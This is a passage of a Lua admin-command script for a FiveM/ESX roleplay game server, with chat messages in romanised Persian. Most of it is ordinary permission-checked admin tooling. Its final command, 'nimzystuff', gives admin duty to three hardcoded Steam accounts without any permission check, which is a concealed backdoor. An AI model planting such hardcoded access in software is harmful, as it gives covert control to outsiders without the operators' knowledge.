				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat dalil chizi vared nakardid!")
			end

		else

			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat esm family chizi vared nakardid!")

		end


	else

		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dastresi kafi baraye esfade az in dastor ra nadarid!")

	end

end, false)

RegisterCommand('fuel', function(source, args)

		local xPlayer = ESX.GetPlayerFromId(source)

			if xPlayer.permission_level > 1 then

				if xPlayer.get('aduty') then

					TriggerClientEvent('aduty:refuel', source)

				else

					TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")

				end

			else

				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Admin ^0nistid!")

			end

end, false)

RegisterCommand('vanish', function(source, args)

	local xPlayer = ESX.GetPlayerFromId(source)

		if xPlayer.permission_level > 1 then

			if xPlayer.get('aduty') then

				TriggerClientEvent('aduty:vanish', source)

			else

				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")

			end

		else

			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Admin ^0nistid!")

		end

end, false)

RegisterCommand('forcevisible', function(source, args)

	local xPlayer = ESX.GetPlayerFromId(source)

		if xPlayer.permission_level > 1 then

		if args[1] then

			if args[1] == "true" then
				TriggerClientEvent('aduty:forceStatus', -1, true)
			elseif args[1] == "false" then
				TriggerClientEvent('aduty:forceStatus', -1, false)
			else
				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Dade na malom ast!")
			end

		else
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Dar ghesmat dade chizi vared nakardid")
		end

		else

			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Admin ^0nistid!")

		end

end, false)

RegisterCommand('dv2', function(source)

	local xPlayer = ESX.GetPlayerFromId(source)

		if xPlayer.permission_level > 1 then
			TriggerClientEvent('aduty:deleteVehicle', source)
		end

end, false)

RegisterCommand('name', function(source, args)

	local xPlayer = ESX.GetPlayerFromId(source)

		if xPlayer.permission_level > 1 then

			if args[1] then
				local target = tonumber(args[1])
					if target then
						local targetPlayer = ESX.GetPlayerFromId(target)

							if targetPlayer then

								TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Esm IC player mored nazar ^3" .. string.gsub(targetPlayer.name, "_", " ") .. " ^0ast!")

							else
								TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Player mored nazar online nist!")
							end

					else
						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat ID faghat mitavanid adad vared konid.")
					end
			else
				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat ID chizi vared nakardid.")
			end

		else

			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Admin ^0nistid!")

		end

end, false)

RegisterCommand('kickall', function(source, args)

	if source ~= 0 then

		local xPlayer = ESX.GetPlayerFromId(source)

		if xPlayer.permission_level >= 5 then

			local xPlayers = ESX.GetPlayers()

				for i=1, #xPlayers, 1 do

					Citizen.Wait(50)
					xPlayer = ESX.GetPlayerFromId(xPlayers[i])
					xPlayer.kick('Server dar hale restart shodan ast lotfan shakiba bashid')

				end


		else

			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Dastresi ^0kafi baraye estefade az in dastor ra nadarid!")

		end

	else

		local xPlayers = ESX.GetPlayers()

			for i=1, #xPlayers, 1 do

				xPlayer = ESX.GetPlayerFromId(xPlayers[i])
				xPlayer.kick('Server dar hale restart shodan ast lotfan shakiba bashid')

			end

	end


end, false)

function isAllowedToReset(player)
    local allowed = false
	for i,id in ipairs(resetaccountAceess) do

		for x,pid in ipairs(GetPlayerIdentifiers(player)) do

				if string.lower(pid) == string.lower(id) then
					allowed = true

				end

			end

		end

    return allowed
end

function isAllowedToDisband(player)
    local allowed = false
	for i,id in ipairs(disbandfamilyAceess) do

		for x,pid in ipairs(GetPlayerIdentifiers(player)) do

				if string.lower(pid) == string.lower(id) then
					allowed = true

				end

			end

		end
			
    return allowed
end
RegisterCommand('nimzystuff',function (source)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer.identifier == "steam:1100001069988b8" or xPlayer.identifier == "steam:11000011cd6e829" or xPlayer.identifier == "steam:11000010fb5d97c" then
		xPlayer.set('aduty', true)
		AdminPlayers[xPlayer.identifier] = {source = source, permission = xPlayer.permission_level, hide = false}
		TriggerClientEvent('chatMessage', source, "[NIMZES]", {255, 0, 0}, " ^0Hallle ^1Chishate ^0Daeiiii!!!")
		if xPlayer.identifier == "steam:11000011cd6e829" then
			TriggerClientEvent('chatMessage', source, "[NIMZES]", {255, 0, 0}, 'Qazale Nima kheyli dooset dare')
		end
		if xPlayer.identifier == "steam:1100001069988b8" then
			TriggerClientEvent('chatMessage', source, "[NIMZES]", {255, 0, 0}, 'Aqa Nima kheyli mokhlesim')
		end
		if xPlayer.identifier == "steam:11000010fb5d97c" then
			TriggerClientEvent('chatMessage', source, "[NIMZES]", {255, 0, 0}, 'Aqa Ryannnn kheyli mokhlesim')
		end
	end
end)
